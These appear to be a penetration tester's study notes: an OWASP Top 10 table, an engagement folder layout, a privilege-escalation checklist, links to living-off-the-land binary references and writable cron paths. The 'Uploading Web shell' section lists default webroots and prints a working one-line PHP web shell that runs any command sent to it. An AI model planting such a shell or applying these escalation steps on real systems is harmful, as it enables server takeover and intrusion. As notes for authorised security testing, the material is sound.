-   Network and infrastructure security
-   Application security
-   Security testing
-   Systems auditing
-   Business continuity planning
-   Digital forensics
-   Incident detection and response


# Risk managment process

![[Pasted image 20230322133208.png]]


# Folder structure

```c
Projects/
|__Acme Company
	|__EPT
	|	|__Evidence
	|	|	|__Credentials
	|	|	|__Data
	|	|	|__Secreenshots
	|	|__ logs
	|	|__ scas
	|	|__ scope
	|	|__ tools
	|__	IPT
		|__ Evidence
		|		|__Credentials
		|		|__Data
		|		|__Secreenshots
		|__ logs
		|__ scans
		|__ scope
		|__ tools
```

# TOP 10 OWASP (open source web applications security project)

- Most of our assesments would be arround #OWASP 10, not nessesarily but commenly.
- 
 | NUMBER | CATEGORY                                    | DESCRIPTION                                                                                                                                                                                                                                                                                  |
 | ------ | ------------------------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
 | 1.     | Broken access control                       | Resctrictions are not emplimented, users can access other users data, view sensitive data,...etc                                                                                                                                                                                             |
 | 2.     | Cryptographic failures                      | Cryptography related failure often leads to data leak, or system compromise                                                                                                                                                                                                                  |
 | 3.     | Injection                                   | User-supplies data is not validated & sanitised, leads to data exposure, system compromisation, examples of this are SQL injection, command injection, LDAP injection ... etc                                                                                                                |
 | 4.     | Insecure Design                             | These issues happen when the application is not designed with security in mind.                                                                                                                                                                                                              |
 | 5.     | Security Misconfiguration                   | Missing appropriate security hardening, leading to data exposure, insecure default configurations, open cloud sotrage ..., Verbose error handeling leading to the leak of sensetive information                                                                                              |
 | 6.     | Vulnerable and Outdated Components          | Using components (both client-side and server-side) that are vulnerable, unsupported, or out of date.                                                                                                                                                                                        |
 | 7.     | Identifications and authentications failure | Authentication-related attacks that target user's identity, authentication, and session management.                                                                                                                                                                                          |
 | 8.     | Software  and Data Integrity Failure        | Software and data integrity failures relate to code and infrastructure that does not protect against integrity violations. An example of this is where an application relies upon plugins, libraries, or modules from untrusted sources, repositories, and content delivery networks (CDNs). |
 | 9.     | Security Logging and Monitoring Failures    | This category is to help detect, escalate, and respond to active breaches. Without logging and monitoring, breaches cannot be detected..                                                                                                                                                     |
 | 10.    | Server-Side request Forgery                 | SSRF flaws occur whenever a web application is fetching a remote resource without validating the user-supplied URL. It allows an attacker to coerce the application to send a crafted request to an unexpected destination, even when protected by a firewall, VPN, or another type of network access control list (ACL).                                                                                                                                                                                                                                                                                            |


# Uploading Web shell

Default webroots to upload web shell into
| Web Server | Default Webroot        |
| ---------- | ---------------------- |
| Apache     | /var/www/html/         |
| Nginx      | /usr/local/nginx/html/ |
| ISS        | c:\\intepub\\wwwroot\\ |
| XAMPP      | C:\\xampp\\htdocs\\    |

Php request shell, accepts, post & get
```php
<?php system($_REQUEST["cmd"]); ?>
```


# Priv-esc Small cheklist
1. Kernel
2. Vulnerable software
	-  dpkg -l , C:\\Program Files
1. credentials
2. database
3. set uids, guids
4. Windows Token  Privileges
5. Scheduled Tasks
6. Exposed credentials
	- LOG files, configuration files
7. Passwords re-use
8. SSH keys
9. Internal services

# #Bins

| SYSTEM  | SOURCE                             |
| ------- | ---------------------------------- |
| Windows | https://lolbas-project.github.io/# |
| linux   | https://gtfobins.github.io/        |


- Con jobs
 if we have the write permission to those directories
 /etc/crontab
 /etc/cron.d
 /var/spool/cron/crontab/root